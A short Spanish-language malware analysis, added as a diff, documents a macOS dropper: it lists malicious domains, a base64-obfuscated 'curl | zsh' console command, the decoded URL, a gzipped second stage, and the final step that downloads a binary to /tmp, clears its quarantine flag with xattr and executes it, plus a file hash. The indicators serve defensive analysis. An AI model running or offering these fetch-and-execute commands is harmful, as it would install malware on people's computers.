@@ -1,0 +1,35 @@
+Dominio malicioso:
+*******************
+https://bgjkmwgnj.pages.dev/
+https://saramoftah.com
+
+
+comando de ejecución en consola:
+********************************
+curl -LskSf $(echo 'aHR0cHM6Ly9zYXJhbW9mdGFoLmNvbS9jdXJsL2M2M2VjZDcyNjU5MTJkZTg1MmIwNzk2Y2YyOTVjODFjZDNiODFmYmQwYjFkYTNjZjAzYmQxNTZiM2VlYjRkMzY='|base64 -D)|zsh
+
+
+Base64 decodificado:
+***********************
+
+curl -Lsk https://saramoftah.com/curl/c63ecd7265912de852b0796cf295c81cd3b81fbd0b1da3cf03bd156b3eeb4d36
+
+
+Payload:
+**********
+
+eb4d36      
+#!/bin/zsh
+toee81=$(base64 -D <<'PAYLOAD_END' | gunzip
+H4sIAIIKo2kC/13LMQqAMAxA0b2niAhdpGb3NrFWU2hsaSOIp9dRHf+D33c4xx2vxsYfNYHLgCoFOaQSKrBqaRNio0qSVyUefRbcgsQ94lEW0gDWwkmqFZz/zI97lrzAcP79leYGTyFTlYMAAAA=
+PAYLOAD_END
+)
+eval "$toee81"
+
+Decodificamos el Payload:
+**************************
+
+#!/bin/zsh curl -o /tmp/helper https://saramoftah.com/gemini/update && xattr -c /tmp/helper && chmod +x /tmp/helper && /tmp/helper
+
+HASH:
+943425ca8f2255426e892dc98ef1d4efb9bce6348c2182556b0f6f309db57f12
